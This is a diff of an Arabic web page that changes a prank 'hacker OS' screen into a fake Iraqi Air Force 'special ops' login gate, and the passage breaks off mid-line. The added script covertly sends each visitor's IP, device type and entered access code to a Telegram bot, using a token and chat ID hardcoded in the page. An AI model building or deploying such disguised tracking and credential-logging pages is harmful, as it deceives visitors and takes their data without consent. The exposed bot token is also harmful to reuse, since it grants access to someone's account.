@@ -2,142 +2,100 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ALI-OS | v.999999.0</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Cairo:wght@700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IQAF | مركز العمليات المشفر</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@500&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00f3ff; --danger: #ff003c; }
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: 'Orbitron', 'Cairo', sans-serif; overflow: hidden; color: var(--neon); }
-        
-        /* تأثير Matrix في الخلفية */
-        #canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
+        :root { --gold: #d4af37; --army: #1a1a1a; --danger: #ff0000; }
+        body { background: #000; color: #fff; font-family: 'Cairo', sans-serif; margin: 0; overflow: hidden; }
 
-        /* شاشة التحميل الفخمة */
-        #boot-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 10000; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center;
+        /* بوابة الدخول العسكرية */
+        #GATE {
+            position: fixed; width: 100%; height: 100%; background: radial-gradient(circle, #1a1a1a, #000);
+            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999;
         }
-        .loader { width: 250px; height: 5px; background: #111; position: relative; margin-top: 20px; overflow: hidden; border: 1px solid var(--neon); }
-        .progress { position: absolute; height: 100%; background: var(--neon); width: 0; animation: load 4s forwards; box-shadow: 0 0 15px var(--neon); }
-        @keyframes load { 0% { width: 0; } 100% { width: 100%; } }
+        .auth-box { background: rgba(255,255,255,0.05); padding: 30px; border: 1px solid var(--gold); border-radius: 5px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 0 25px rgba(212, 175, 55, 0.15); }
+        .unit-id { background: #000; border: 1px solid var(--gold); color: var(--gold); padding: 12px; width: 100%; text-align: center; font-family: 'Orbitron'; font-size: 24px; letter-spacing: 8px; margin-bottom: 20px; outline: none; }
+        .btn-deploy { background: var(--gold); color: #000; border: none; padding: 12px; width: 100%; font-weight: 900; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .btn-deploy:active { transform: scale(0.98); background: #b8952d; }
 
-        /* سطح المكتب */
-        #desktop { display: none; height: 100%; padding: 20px; box-sizing: border-box; background: radial-gradient(circle, #001a1a 0%, #000 100%); }
-        
-        .icon { width: 80px; text-align: center; margin-bottom: 30px; cursor: pointer; transition: 0.3s; }
-        .icon:active { transform: scale(0.9); }
-        .icon img { width: 50px; filter: drop-shadow(0 0 5px var(--neon)); }
-        .icon span { display: block; font-size: 10px; margin-top: 5px; color: #fff; }
+        /* واجهة العمليات المشفرة */
+        #OPERATIONS_HUB { display: none; padding: 20px; height: 100vh; background: #0c0c0c; border: 5px solid #1a1a1a; box-sizing: border-box; }
+        .top-bar { border-bottom: 1px solid var(--gold); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .status-tag { background: #004400; color: #0f0; padding: 3px 10px; font-size: 10px; border: 1px solid #0f0; border-radius: 3px; animation: blink 1.5s infinite; }
+        @keyframes blink { 50% { opacity: 0.3; } }
 
-        /* النوافذ */
-        .window {
-            position: absolute; top: 20%; left: 10%; width: 80%;
-            background: rgba(0, 10, 10, 0.9); border: 1px solid var(--neon);
-            box-shadow: 0 0 30px rgba(0, 243, 255, 0.2); display: none; z-index: 100;
-        }
-        .win-header { background: var(--neon); color: #000; padding: 5px 10px; font-weight: 900; font-size: 12px; display: flex; justify-content: space-between; }
-        .win-content { padding: 15px; font-size: 13px; color: #fff; line-height: 1.6; }
-
-        /* شريط المهام السفلي */
-        #taskbar {
-            position: fixed; bottom: 0; left: 0; width: 100%; height: 45px;
-            background: rgba(0, 0, 0, 0.8); border-top: 1px solid var(--neon);
-            display: flex; align-items: center; padding: 0 15px; box-sizing: border-box;
-        }
+        .comms-panel { background: #050505; border: 1px solid #222; height: 50%; padding: 15px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #0f0; border-radius: 5px; }
+        .msg { margin-bottom: 8px; border-right: 3px solid var(--gold); padding-right: 10px; line-height: 1.5; }
     </style>
 </head>
 <body>
 
-    <canvas id="canvas"></canvas>
-
-    <div id="boot-screen">
-        <h2 style="letter-spacing: 5px;">ALI CORE SYSTEMS</h2>
-        <p style="font-size: 12px; color: #888;">INITIALIZING V.999999.0...</p>
-        <div class="loader"><div class="progress"></div></div>
-        <p id="boot-log" style="font-size: 10px; margin-top: 10px;"></p>
+    <div id="GATE">
+        <div style="font-family: 'Orbitron'; color: var(--gold); font-size: 11px; margin-bottom: 10px; letter-spacing: 2px;">IQAF SPECIAL OPS | COMMAND GATE</div>
+        <div class="auth-box">
+            <h3 style="margin-top: 0; color: var(--gold);">نظام التشفير الجوي</h3>
+            <p style="font-size: 11px; color: #aaa;">أدخل رمز الولوج للمقر السري (LEVEL 5)</p>
+            <input type="password" id="unit_key" class="unit-id" placeholder="****" maxlength="4">
+            <button class="btn-deploy" onclick="verifyUnit()">تأكيد الهوية</button>
+        </div>
     </div>
 
-    <div id="desktop">
-        <div class="icon" onclick="openWin('files')">
-            <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png">
-            <span>الملفات السرية</span>
-        </div>
-        <div class="icon" onclick="openWin('spy')">
-            <img src="https://cdn-icons-png.flaticon.com/512/2592/2592323.png">
-            <span>كاميرا التجسس</span>
-        </div>
-        <div class="icon" onclick="openWin('id')">
-            <img src="https://cdn-icons-png.flaticon.com/512/1067/1067256.png">
-            <span>بصمة الزائر</span>
+    <div id="OPERATIONS_HUB">
+        <div class="top-bar">
+            <div>
+                <span style="color: var(--gold); font-weight: 900; font-size: 18px;">مقر قيادة الصقور</span>
+                <div style="font-size: 10px; color: #666;">HQ: IQAF_SPECIAL_UNIT (WASIT)</div>
+            </div>
+            <div class="status-tag">اتصال مشفر نشط</div>
         </div>
 
-        <div id="files" class="window">
-            <div class="win-header"><span>SECRET_FILES.LOG</span><span onclick="closeWin('files')">X</span></div>
-            <div class="win-content">
-                > تم العثور على 152 صورة مخفية...<br>
-                > جاري استخراج محادثات الواتساب...<br>
-                <span style="color:red">! خطأ: الذاكرة ممتلئة ببيانات الضحية !</span>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px;">
+            <div style="background: #151515; padding: 12px; border-radius: 5px; border-left: 3px solid var(--gold);">
+                <div style="font-size: 10px; color: var(--gold);">الحالة القتالية</div>
+                <div style="font-size: 14px; font-weight: bold;">جاهز للإقلاع (Ready)</div>
+            </div>
+            <div style="background: #151515; padding: 12px; border-radius: 5px; border-left: 3px solid var(--gold);">
+                <div style="font-size: 10px; color: var(--gold);">نظام التشفير</div>
+                <div style="font-size: 14px; font-weight: bold;">AES-256 ACTIVE</div>
             </div>
         </div>
 
-        <div id="id" class="window">
-            <div class="win-header"><span>VISITOR_ID</span><span onclick="closeWin('id')">X</span></div>
-            <div class="win-content" id="visitor-data">
-                جاري سحب الهوية الرقمية...
-            </div>
-        </div>
-
-        <div id="taskbar">
-            <span style="font-weight: 900; color: var(--neon);">ALI_OS</span>
-            <span id="clock" style="margin-right: auto; font-size: 12px;">00:00</span>
+        <div class="comms-panel" id="comms">
+            <div class="msg">📡 تم ربط القمر الصناعي العسكري بنجاح...</div>
+            <div class="msg">🔑 تم التحقق من البصمة الرقمية للآمر...</div>
+            <div class="msg">🔒 تشفير الخط (End-to-End) مفعل الآن.</div>
+            <div class="msg">🦅 أهلاً بك في غرفة العمليات، بانتظار الأوامر.</div>
         </div>
     </div>
 
     <script>
-        // تأثير Matrix
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        const fontSize = 10;
-        const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
-        function draw() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px arial";
-            drops.forEach((y, i) => {
-                const text = letters[Math.floor(Math.random() * letters.length)];
-                ctx.fillText(text, i * fontSize, y * fontSize);
-                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(draw, 33);
+        // --- إعدادات البوت العسكري (قم بالتعديل هنا) ---
+        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; // حط التوكن مالتك هنا
+        const TG_ID = "7772577035"; // حط الآيدي مالتك هنا
+        const UNIT_SECRET = "1931"; // رمز الدخول السري
 
-        // التحكم بالنظام
-        setTimeout(() => {
-            document.getElementById('boot-screen').style.display = 'none';
-            document.getElementById('desktop').style.display = 'block';
-            loadData();
-        }, 4500);
-
-        function openWin(id) { document.getElementById(id).style.display = 'block'; }
-        function closeWin(id) { document.getElementById(id).style.display = 'none'; }
-
-        async function loadData() {
-            const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"SECURED"}));
-            document.getElementById('visitor-data').innerHTML = `
-                IP: <span style="color:yellow">${ip.ip}</span><br>
-                SYS: ${navigator.platform}<br>
-                BAT: جاري الاستنزاف...<br>
-                LOC: WASIT_V_NET
-            `;
+        // وظيفة لتحليل نوع الجهاز بدقة (Mapping)
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "📱 Android Mobile";
+            if (/iPhone|iPad|iPod/i.test(ua)) return "🍎 Apple iOS Device";
+            if (/Windows/i.test(ua)) return "💻 Windows PC";
+            if (/Macintosh/i.test(ua)) return "🖥️ MacBook/Mac";
+            if (/Linux/i.test(ua)) return "🐧 Linux System";
+            return "❓ Unknown Unit";
         }
 
-        setInterval(() => {
-            document.getElementById('clock').innerText = new Date().toLocaleTimeString('ar-EG');
-        }, 1000);
-    </script>
-</body>
-</html>
+        // وظيفة إرسال المعلومات للتلجرام
+        async function sendIntel(status, enteredKey) {
+            try {
+                // سحب الـ IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // تحديد اسم الجهاز المفهوم
+                const device = getDeviceName(); 
+                
+                const text = `🚨 **تقرير أمني - بوابة الصقور**\n\n🔹 الحالة: ${status}\n🔹 الرمز المدخل: \`${enteredKey}\`\n📱 الجهاز: *${device}*\n🌐 IP: \`${ipData.ip}\`\n⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;
+                
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encode
